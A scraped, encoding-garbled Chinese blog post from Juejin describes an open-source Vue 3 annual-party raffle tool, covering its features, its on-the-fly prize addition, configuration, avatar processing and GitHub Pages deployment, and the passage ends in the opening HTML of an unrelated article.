h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å»å¹´ä¸ºäº†å¹´ä¼šæŠ½å¥–ä¸´æ—¶åšäº†è¿™ä¸ªå°å·¥å…·ï¼Œä»Šå¹´åˆè¢«ç‚¹åç”¨åŒä¸€å¥—æ–¹æ¡ˆã€‚<br/>
è¶ç€å¤ç”¨çš„æœºä¼šï¼ŒæŠŠä¹‹å‰æ¬ ä¸‹çš„ä¸€äº›å°å‘é¡ºæ‰‹è¡¥äº†ä¸€è½®ï¼Œæ•´ç†å®Œå–„ä¹‹åï¼Œå°±å†³å®šé¡ºä¾¿å‘å‡ºæ¥ç»™å¤§å®¶ä¹Ÿèƒ½ç›´æ¥ç”¨ï¼š</p>
<ul>
<li>åœ¨çº¿åœ°å€ï¼š<code>https://huyikai.github.io/AnnualRaffle/</code></li>
</ul>
<p>ä¸‹é¢ä¸»è¦æƒ³åˆ†äº«ä¸¤ä»¶äº‹ï¼š</p>
<ul>
<li>è¿™å¥—å·¥å…·å¤§æ¦‚èƒ½åšä»€ä¹ˆï¼›</li>
<li>ä¸ºå•¥æˆ‘è¦åœ¨ UI é‡Œç•™ä¸€ä¸ªâ€œä¸´æ—¶åŠ å¥–é¡¹â€çš„å…¥å£ï¼Œä»¥åŠå®æˆ˜ä¸­è¿™ä¸ªå…¥å£æ˜¯æ€ä¹ˆæ•‘åœºçš„ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-0">è¿™ä¸ªâ€œå¹´ä¼šæŠ½å¥–â€å¤§æ¦‚é•¿ä»€ä¹ˆæ ·</h2>
<p>ä¸ç”¨å¤ªå¤šå½¢å®¹è¯ï¼Œå°±æŒ‰æ¨¡å—ç®€å•è¯´ä¸€ä¸‹ã€‚</p>
<h3 data-id="heading-1">æŠ½å¥–è§†è§‰</h3>
<ul>
<li>ä¸­å¿ƒæ˜¯ä¸€ä¸ª <strong>3D æ ‡ç­¾äº‘</strong>ï¼Œæ‰€æœ‰å‚ä¸æŠ½å¥–çš„äººä¼šåœ¨é‡Œé¢æ—‹è½¬ã€‚</li>
<li>æ¯ä¸ªäººå¯ä»¥é…å¤´åƒï¼ŒæŠ½åˆ°çš„æ—¶å€™ä¼šåŒæ—¶å±•ç¤ºåå­—å’Œç…§ç‰‡ã€‚</li>
<li>æ²¡é…å¤´åƒçš„ä¼šç”¨é»˜è®¤å¤´åƒå…œåº•ã€‚</li>
</ul>
<h3 data-id="heading-2">å¥–é¡¹ç›¸å…³</h3>
<ul>
<li>é»˜è®¤æœ‰å¸¸è§„å¥–é¡¹ï¼šä¸€ç­‰å¥–ã€äºŒç­‰å¥–ã€ä¸‰ç­‰å¥–ã€å¹¸è¿å¥–ä¹‹ç±»ã€‚</li>
<li>æ¯ä¸ªå¥–é¡¹å¯ä»¥åœ¨ç•Œé¢ä¸Šæ”¹ä¸­å¥–äººæ•°ã€‚</li>
<li>å¯ä»¥é…ç½® <strong>é¢„è®¾åå•</strong>ï¼š
<ul>
<li>æ¯”å¦‚æŸä¸ªç‰¹æ®Šå¥–é¡¹ï¼Œä¸­å¥–äººæ˜¯æå‰å®šå¥½çš„ï¼Œåªæ˜¯æƒ³åœ¨ç°åœºèµ°ä¸ªæµç¨‹ã€‚</li>
</ul>
</li>
<li>æ”¯æŒ <strong>å…¨å±€æ’é™¤åå•</strong>ï¼ˆé¢†å¯¼ä¸å‚ä¸æŠ½å¥–è¿™ç±»åœºæ™¯ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-3">æŠ½å¥–è¿‡ç¨‹</h3>
<ul>
<li>åº•éƒ¨é€‰æ‹©å¥–é¡¹ï¼Œç‚¹å‡»å¼€å§‹ï¼Œ3D æ ‡ç­¾äº‘é£å¿«è½¬èµ·æ¥ã€‚</li>
<li>æœ‰èƒŒæ™¯éŸ³ä¹ã€å¼€å§‹éŸ³æ•ˆï¼Œå¯ä»¥é™éŸ³ã€è°ƒéŸ³é‡ï¼Œè®¾ç½®ä¼šä¿å­˜åœ¨æµè§ˆå™¨é‡Œã€‚</li>
<li>æŠ½å®Œä¹‹åä¼šå±•ç¤ºæœ¬è½®ä¸­å¥–äººï¼Œç‚¹å‡»å¯ä»¥åˆ æ‰ï¼Œé˜²æ­¢è¯¯æ“ä½œã€‚</li>
</ul>
<h3 data-id="heading-4">æ•°æ®æŒä¹…åŒ–</h3>
<ul>
<li>æŠ½å¥–é…ç½®ã€åå•ã€ç»“æœã€éŸ³é¢‘è®¾ç½®éƒ½å­˜åœ¨ <code>localStorage</code>ã€‚</li>
<li>å¤´åƒæ–‡ä»¶æ”¾åœ¨ <code>public/user/</code>ï¼Œå…ƒæ•°æ®ç”¨ <code>IndexedDB</code> ç®¡ã€‚</li>
</ul>
<p>å°±ç®—ç°åœºä¸å°å¿ƒåˆ·æ–°äº†æµè§ˆå™¨ï¼ŒæŠ½è¿‡çš„ç»“æœè¿˜åœ¨ï¼Œä¸è‡³äºä»å¤´æ¥è¿‡ã€‚</p>
<hr/>
<h2 data-id="heading-5">ä¸ºä»€ä¹ˆ UI é‡Œä¸“é—¨ç•™äº†ä¸€ä¸ªâ€œä¸´æ—¶åŠ å¥–é¡¹â€</h2>
<p>è¿™é‡Œæœ‰ä¸ªå°æ•…äº‹ã€‚</p>
<p>å»å¹´é‚£åœºå¹´ä¼šï¼ŒæŠ½åˆ°ä¸€åŠï¼Œé¢†å¯¼çªç„¶æ¥äº†å¥ï¼š<br/>
â€œå†åŠ ä¸€ä¸ªç‰¹åˆ«å¥–å§ï¼Œå°±ç°åœ¨æŠ½ã€‚â€</p>
<p>å¦‚æœå¥–é¡¹æ˜¯å†™æ­»åœ¨ä»£ç é‡Œï¼Œè¿™ç§éœ€æ±‚åŸºæœ¬æ„å‘³ç€ï¼š</p>
<ul>
<li>æ”¹é…ç½®ï¼›</li>
<li>é‡æ–°æ‰“åŒ…ï¼›</li>
<li>é‡æ–°éƒ¨ç½²ï¼›</li>
<li>ç¥ˆç¥·ä¸€åˆ‡é¡ºåˆ©ã€‚</li>
</ul>
<p>ç°åœºå‡ ç™¾ä¸ªäººç›¯ç€å¤§å±å¹•ï¼Œè¿™ç§æ“ä½œå°±å¾ˆä¸ç°å®äº†ã€‚</p>
<p>æ‰€ä»¥è¿™æ¬¡æˆ‘åœ¨è®¾è®¡çš„æ—¶å€™ï¼Œåˆ»æ„åšäº†ä¸€ä¸ªåˆ†å±‚ï¼š</p>
<ul>
<li><strong>ä»£ç é‡Œ</strong>ï¼šæœ‰ä¸€å¥—ç›¸å¯¹ç¨³å®šçš„é»˜è®¤å¥–é¡¹é…ç½®ï¼Œæ”¾åœ¨ <code>src/config/lottery.ts</code>ï¼Œæ–¹ä¾¿ç‰ˆæœ¬ç®¡ç†å’Œä»£ç  reviewã€‚</li>
<li><strong>UI é‡Œ</strong>ï¼šä¿ç•™â€œå¢åŠ å¥–é¡¹â€çš„äº¤äº’ï¼Œå¯ä»¥ç°åœºä¸´æ—¶åŠ ä¸€ä¸ªå¥–é¡¹ã€è®¾å®šäººæ•°ï¼Œç”¨å®Œå°±ç®—ã€‚</li>
</ul>
<p>å®æˆ˜æ—¶è¿™ä¸ªå…¥å£ç¡®å®æ•‘äº†åœºï¼šä¸»æŒäººè¯´åŠ å¥–ï¼Œæˆ‘ç›´æ¥åœ¨é…ç½®å¼¹çª—é‡ŒåŠ äº†ä¸€ä¸ªæ–°å¥–é¡¹ï¼Œå¡«å¥½åå­—å’Œæ•°é‡ï¼Œç‚¹ä¿å­˜ï¼Œå°±å¯ä»¥ç»§ç»­æŠ½äº†ï¼Œä¸éœ€è¦é‡å¯ã€ä¸éœ€è¦æ”¹ä»£ç ã€‚</p>
<p>è¿™ç±»ç°åœºå·¥å…·ï¼Œç»™ä¸šåŠ¡æ–¹ç•™ä¸€ç‚¹â€œä¸´æ—¶æ“ä½œç©ºé—´â€ï¼Œæ¯”çº¯ç²¹çš„â€œé…ç½®ä¼˜é›…â€è¦é‡è¦å¾ˆå¤šã€‚</p>
<hr/>
<h2 data-id="heading-6">æŠ€æœ¯å †æ ˆç®€å•å¸¦ä¸€ä¸‹</h2>
<p>ä¸ç»†è®²å®ç°ï¼ŒåªæŠŠå †æ ˆå’Œå¤§è‡´ç»“æ„åˆ—ä¸€ä¸‹ï¼Œæ–¹ä¾¿æœ‰å…´è¶£çš„åŒå­¦é¡ºç€ä»£ç çœ‹ï¼š</p>
<ul>
<li><strong>åŸºç¡€æ¡†æ¶</strong>
<ul>
<li>Vue 3 + TypeScript</li>
<li>Vite</li>
</ul>
</li>
<li><strong>çŠ¶æ€ç®¡ç†</strong>
<ul>
<li>Piniaï¼šè´Ÿè´£å½“å‰å¥–é¡¹ã€ç»“æœåˆ—è¡¨ã€é…ç½®ç­‰å…¨å±€çŠ¶æ€</li>
</ul>
</li>
<li><strong>UI / æ ·å¼</strong>
<ul>
<li>Element Plusï¼šå¼¹çª—ã€è¡¨å•ã€æŒ‰é’®ç­‰åŸºç¡€ç»„ä»¶</li>
<li>Tailwind CSSï¼šå¸ƒå±€å’Œæ ·å¼</li>
</ul>
</li>
<li><strong>å¯è§†åŒ– / å¤šåª’ä½“</strong>
<ul>
<li>TagCanvasï¼š3D æ ‡ç­¾äº‘</li>
<li>HTML5 Audioï¼šèƒŒæ™¯éŸ³ä¹å’ŒéŸ³æ•ˆ</li>
</ul>
</li>
<li><strong>æ•°æ®å­˜å‚¨</strong>
<ul>
<li>localStorageï¼šé…ç½®ã€åå•ã€æŠ½å¥–ç»“æœã€éŸ³é¢‘è®¾ç½®</li>
<li>IndexedDBï¼šå¤´åƒå…ƒæ•°æ®</li>
</ul>
</li>
</ul>
<p>ç›®å½•æ‹†æ³•æ¯”è¾ƒå¸¸è§„ï¼š</p>
<ul>
<li><code>composables/</code>ï¼šæŠ½å¥–é€»è¾‘ã€3D æ ‡ç­¾äº‘å°è£…ã€éŸ³é¢‘æ§åˆ¶ã€‚</li>
<li><code>config/</code>ï¼šå¥–é¡¹é…ç½®ã€ç”¨æˆ·ç¤ºä¾‹æ•°æ®ã€‚</li>
<li><code>helper/</code>ï¼šæŠ½å¥–ç®—æ³•ã€IndexedDB æ“ä½œã€‚</li>
<li><code>components/</code>ï¼šé…ç½®å¼¹çª—ã€ç»“æœå±•ç¤ºã€å…¬ç¤ºç»„ä»¶ç­‰ã€‚</li>
</ul>
<p>å¦‚æœä½ æƒ³æ”¹ UI æˆ–æ¥å…¥è‡ªå®¶ç³»ç»Ÿï¼Œå¤§æ¦‚åªéœ€è¦çœ‹è¿™å‡ ä¸ªç›®å½•å°±å¤Ÿäº†ã€‚</p>
<hr/>
<h2 data-id="heading-7">çœŸè¦ç”¨åœ¨å¹´ä¼šï¼Œå¤§æ¦‚è¿™ä¹ˆæå°±å¤Ÿäº†</h2>
<p>å‡è®¾ä½ ä¹Ÿè¦æä¸€åœºå¹´ä¼šæŠ½å¥–ï¼Œå¯ä»¥æŒ‰è¿™ä¸ªé¡ºåºæ¥ï¼š</p>
<h3 data-id="heading-8">1. æ‹‰ä»£ç  &amp; è·‘èµ·æ¥</h3>
<pre><code class="hljs language-bash" lang="bash">pnpm install
pnpm dev
</code></pre>
<p>æµè§ˆå™¨æ‰“å¼€æœ¬åœ°åœ°å€ï¼Œå…ˆç”¨ç¤ºä¾‹æ•°æ®è·‘ä¸€éæµç¨‹ï¼Œç†Ÿæ‚‰ä¸€ä¸‹ç•Œé¢ã€‚</p>
<h3 data-id="heading-9">2. æ¢æˆä½ ä»¬è‡ªå·±çš„åå•</h3>
<p>åœ¨ä»£ç é‡Œï¼š</p>
<ol>
<li>å¤åˆ¶ <code>src/config/user.example.ts</code> â†’ <code>src/config/user.ts</code></li>
<li>æŠŠé‡Œé¢çš„ç”¨æˆ·åˆ—è¡¨æ”¹æˆä½ ä»¬çš„äººï¼š</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">UserItem</span>[] = [
  { <span class="hljs-attr">key</span>: <span class="hljs-number">1001</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span> },
  { <span class="hljs-attr">key</span>: <span class="hljs-number">1002</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'æå››'</span> },
  <span class="hljs-comment">// ...</span>
];

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">excludedUsers</span>: <span class="hljs-title class_">UserItem</span>[] = [
  { <span class="hljs-attr">key</span>: <span class="hljs-number">9999</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'æŸæ€»'</span> }, <span class="hljs-comment">// ä¸å‚ä¸æ‰€æœ‰å¥–é¡¹</span>
];
</code></pre>
<p>ä¸åˆ›å»º <code>user.ts</code> ä¹Ÿèƒ½è·‘ï¼Œåªæ˜¯èµ°ç¤ºä¾‹æ•°æ®ã€‚</p>
<h3 data-id="heading-10">3. é…å¥–é¡¹</h3>
<ul>
<li><strong>å¹³æ—¶</strong>ï¼šæ”¹ <code>src/config/lottery.ts</code> é‡Œçš„é»˜è®¤å¥–é¡¹å³å¯ã€‚</li>
<li><strong>ç°åœº</strong>ï¼šå¯ä»¥ç›´æ¥åœ¨â€œæŠ½å¥–é…ç½®â€å¼¹çª—é‡Œï¼š
<ul>
<li>è°ƒæ•´æ¯ä¸ªå¥–é¡¹çš„æ•°é‡ï¼›</li>
<li>ç»™æŸä¸ªå¥–é¡¹åŠ â€œé¢„è®¾åå•â€ï¼ˆé€—å·åˆ†éš”çš„ç”¨æˆ· IDï¼‰ï¼›</li>
<li>å¿…è¦æ—¶åŠ ä¸€ä¸ªä¸´æ—¶å¥–é¡¹ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-11">4. æå®šå¤´åƒï¼ˆå¼ºçƒˆå»ºè®®ï¼‰</h3>
<p>è§†è§‰æ°›å›´åŸºæœ¬é å®ƒã€‚</p>
<p>åšæ³•ï¼š</p>
<ol>
<li>å‡†å¤‡å¤´åƒå›¾ç‰‡ï¼Œå»ºè®® 160Ã—160 å·¦å³ï¼Œä½“ç§¯åˆ«å¤ªå¤§ã€‚</li>
<li>æ”¾åˆ° <code>public/user/</code> ç›®å½•ã€‚</li>
<li>å‘½åè§„åˆ™ï¼š<code>ç”¨æˆ· key + æ‰©å±•å</code>ï¼Œæ¯”å¦‚ <code>1001.jpg</code>ã€‚</li>
</ol>
<p>é¡¹ç›®é‡Œè¿˜æœ‰ä¸€ä¸ªæ‰¹é‡å¤„ç†å¤´åƒçš„è„šæœ¬ï¼Œæ”¾åœ¨ <code>scripts/</code> é‡Œï¼Œç”¨æ¥æŠŠåŸå§‹ç…§ç‰‡ç»Ÿä¸€è£æˆå¤´åƒï¼Œç»†èŠ‚å¯ä»¥çœ‹ <code>scripts/README.md</code>ã€‚</p>
<hr/>
<h2 data-id="heading-12">æ‰¹é‡å¤´åƒå¤„ç†è„šæœ¬ï¼šä»â€œçœŸäººç…§ç‰‡â€åˆ°ç»Ÿä¸€å¤´åƒ</h2>
<p>çœŸå®æƒ…å†µæ˜¯ï¼ŒåŸå§‹å‘˜å·¥ç…§ç‰‡çš„å°ºå¯¸ã€æ¯”ä¾‹ã€èƒŒæ™¯è‰²åŸºæœ¬éƒ½ä¸ä¸€æ ·ï¼Œç›´æ¥æ‹¿æ¥åšå¤´åƒæ•ˆæœä¼šå¾ˆæ€ªã€‚</p>
<p>ä¸ºæ­¤æˆ‘åœ¨ <code>scripts/</code> ç›®å½•ä¸‹å†™äº†ä¸€å¥—æ‰¹é‡å¤´åƒå¤„ç†è„šæœ¬ï¼Œä¸»è¦åšè¿™äº›äº‹ï¼š</p>
<ul>
<li>æ‰¹é‡è£å‰ª / ç¼©æ”¾æˆç»Ÿä¸€å°ºå¯¸ï¼ˆé»˜è®¤ 160Ã—160ï¼‰ã€‚</li>
<li>ç»Ÿä¸€èƒŒæ™¯è‰²ã€ç»Ÿä¸€æ ¼å¼ï¼ˆJPG/PNGï¼‰ã€‚</li>
<li>æä¾›â€œå¿«é€Ÿæ¨¡å¼â€å’Œâ€œAI å¢å¼ºæ¨¡å¼â€ï¼ŒæŒ‰è‡ªå·±çš„ç¯å¢ƒå’Œéœ€æ±‚é€‰æ‹©ã€‚</li>
</ul>
<p>å…¸å‹ç”¨æ³•ï¼š</p>
<ol>
<li>æŠŠåŸå›¾æ”¾åˆ° <code>scripts/input/</code>ã€‚</li>
<li>è¿è¡Œï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pnpm run process-images
</code></pre>
<ol start="3">
<li>åœ¨ <code>scripts/output/</code> æ‹¿åˆ°å¤„ç†å¥½çš„å¤´åƒï¼Œæ‹·åˆ° <code>public/user/</code> å³å¯ã€‚</li>
</ol>
<p>è¯¦ç»†é…ç½®ï¼ˆèƒŒæ™¯è‰²ã€å°ºå¯¸ã€æ¨¡å¼å¼€å…³ç­‰ï¼‰åœ¨ <code>scripts/README.md</code> é‡Œéƒ½æœ‰å†™ã€‚</p>
<hr/>
<h2 data-id="heading-13">éƒ¨ç½²ï¼šç”¨ GitHub Pages çœç‚¹äº‹</h2>
<p>é¡¹ç›®ç°åœ¨æ˜¯æ”¾åœ¨ GitHub Pages ä¸Šçš„ï¼Œåœ°å€å°±æ˜¯ï¼š</p>
<ul>
<li><code>https://huyikai.github.io/AnnualRaffle/</code></li>
</ul>
<p>å¦‚æœä½ ä¹Ÿæƒ³è¿™ä¹ˆæï¼Œä¸€èˆ¬æ­¥éª¤æ˜¯ï¼š</p>
<ol>
<li>æŠŠä»£ç æ¨åˆ° GitHubã€‚</li>
<li>ç”¨ GitHub Actions è·‘ä¸€éï¼š
<ul>
<li>å®‰è£…ä¾èµ–ï¼›</li>
<li><code>pnpm build</code>ï¼›</li>
<li>æŠŠ <code>dist/</code> å‘å¸ƒåˆ° <code>gh-pages</code> åˆ†æ”¯ã€‚</li>
</ul>
</li>
<li>åœ¨ä»“åº“ Settings â†’ Pages é‡Œé€‰å¯¹åº”åˆ†æ”¯ã€‚</li>
</ol>
<p>é…ç½®å¥½ä¹‹åï¼Œåé¢æ¯æ¬¡æ¨ä»£ç ï¼Œçº¿ä¸Šé“¾æ¥ä¼šè‡ªåŠ¨æ›´æ–°ã€‚</p>
<hr/>
<h2 data-id="heading-14">å®é™…ä½¿ç”¨æ„Ÿå—</h2>
<p>è¿™å¥—ä¸œè¥¿åœ¨ä¸€åœºä¸åˆ° 200 äººçš„å¹´ä¼šä¸Šè·‘äº†ä¸€æ¬¡ï¼Œæ•´ä½“ä½“éªŒè¿˜å¯ä»¥ï¼š</p>
<ul>
<li>3D æ ‡ç­¾äº‘åŠ ç…§ç‰‡ï¼Œç°åœºè§‚æ„Ÿæ¯”çº¯æ–‡å­—åå•è¦å¥½ä¸å°‘ã€‚</li>
<li>æ•°æ®æŒä¹…åŒ–é¿å…äº†â€œè¯¯åˆ·æ–°å¯¼è‡´é‡æ¥ä¸€æ¬¡â€çš„äº‹æ•…ã€‚</li>
<li>UI é‡Œçš„â€œä¸´æ—¶åŠ å¥–é¡¹â€ç¡®å®å‘æŒ¥äº†ä½œç”¨ï¼Œå¸®æˆ‘ä»¬å…œä½äº†é¢†å¯¼ä¸´æ—¶åŠ å¥–çš„æƒ…å†µã€‚</li>
</ul>
<p>å¦‚æœä½ ä»Šå¹´ä¹Ÿè¢«å®‰æ’åšå¹´ä¼šæŠ½å¥–ï¼Œå¯ä»¥ç›´æ¥æ‹¿è¿™ä¸ªé¡¹ç›®å½“æ¨¡æ¿ï¼š<br/>
å…ˆè·‘ä¸€é Demoï¼Œçœ‹ä¸‹æ˜¯å¦ç¬¦åˆä½ ä»¬åœºæ™¯ï¼Œå†æŒ‰è‡ªå·±éœ€æ±‚æ”¹åå•ã€å¥–é¡¹å’Œ UI å³å¯ã€‚</p>
<hr/>
<h2 data-id="heading-15">ä¸€ç‚¹å¼€å‘è¿‡ç¨‹çš„å°è®°</h2>
<p>è¿™ä¸ªé¡¹ç›®çš„å¼€å‘è¿‡ç¨‹é‡Œï¼Œæˆ‘æ˜¯å€ŸåŠ©äº† <code>Cursor</code> è¿™ç±»è¾…åŠ©å·¥å…·æ¥ææ•ˆçš„ï¼š</p>
<ul>
<li>æ­é¡¹ç›®ã€æ”¹ç»“æ„ã€é‡æ„ä¸€äº›é€»è¾‘æ—¶ï¼Œç”¨å®ƒæ¥å¸®å¿™ç”Ÿæˆæ ·æ¿ä»£ç å’Œåšå±€éƒ¨é‡æ„ã€‚</li>
<li>è¿™ç¯‡æ–‡ç« æœ¬èº«ï¼Œæˆ‘ä¹Ÿå€ŸåŠ©äº† <code>Cursor</code> é‡Œçš„ AI å†™ä½œè¾…åŠ©ï¼Œå†æ ¹æ®è‡ªå·±çš„å®é™…åœºæ™¯åšäº†è°ƒæ•´ã€‚</li>
</ul>
<p>å¦‚æœä½ å¹³æ—¶ä¹Ÿç”¨ VS Code ç±»çš„ç¼–è¾‘å™¨ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹ç±»ä¼¼çš„å·¥ä½œæµï¼š<br/>
è®©å·¥å…·å¸®ä½ å¤„ç†é‡å¤åŠ³åŠ¨ï¼ŒæŠŠç²¾åŠ›æ”¾åœ¨ä¸šåŠ¡å’Œä½“éªŒä¸Šã€‚</p>
<hr/>
<h2 data-id="heading-16">æœ€åï¼šæ¬¢è¿æ¥ GitHub ç‚¹ä¸ª Star</h2>
<p>é¡¹ç›®åœ¨çº¿åœ°å€æˆ‘å†æ”¾ä¸€æ¬¡ï¼š</p>
<ul>
<li>åœ¨çº¿ Demoï¼š<code>https://huyikai.github.io/AnnualRaffle/</code></li>
</ul>
<p>ä»“åº“åœ°å€åœ¨è¿™é‡Œï¼š</p>
<ul>
<li>GitHub ä»“åº“ï¼š<code>https://github.com/huyikai/AnnualRaffle</code></li>
</ul>
<p>å¦‚æœä½ è§‰å¾—è¿™å¥—å¹´ä¼šæŠ½å¥–è¿˜ç®—é¡ºæ‰‹ï¼Œæˆ–è€…å¯¹ä½ æœ‰ä¸€ç‚¹å‚è€ƒä»·å€¼ï¼Œæ¬¢è¿é¡ºæ‰‹ç‚¹ä¸ª Starã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æŠ—å¹²æ‰°LEDæ•°æ˜¾å±é©±åŠ¨VK1624 æ•°ç ç®¡æ˜¾ç¤ºèŠ¯ç‰‡ 3çº¿ä¸²è¡Œæ¥å£]]></title>    <link>https://juejin.cn/post/7595393113552764943</link>    <guid>https://juejin.cn/post/7595393113552764943</guid>    <pubDate>2026-01-15T08:20:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595393113552764943" data-draft-id="7595131688940224552" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æŠ—å¹²æ‰°LEDæ•°æ˜¾å±é©±åŠ¨VK1624 æ•°ç ç®¡æ˜¾ç¤ºèŠ¯ç‰‡ 3çº¿ä¸²è¡Œæ¥å£"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-15T08:20:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¦´è²CC"/> <meta itemprop="url" content="https://juejin.cn/user/4048815548797933"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æŠ—å¹²æ‰°LEDæ•°æ˜¾å±é©±åŠ¨VK1624 æ•°ç ç®¡æ˜¾ç¤ºèŠ¯ç‰‡ 3çº¿ä¸²è¡Œæ¥å£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4048815548797933/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¦´è²CC
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:20:54.000Z" title="Thu Jan 15 2026 08:20:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body 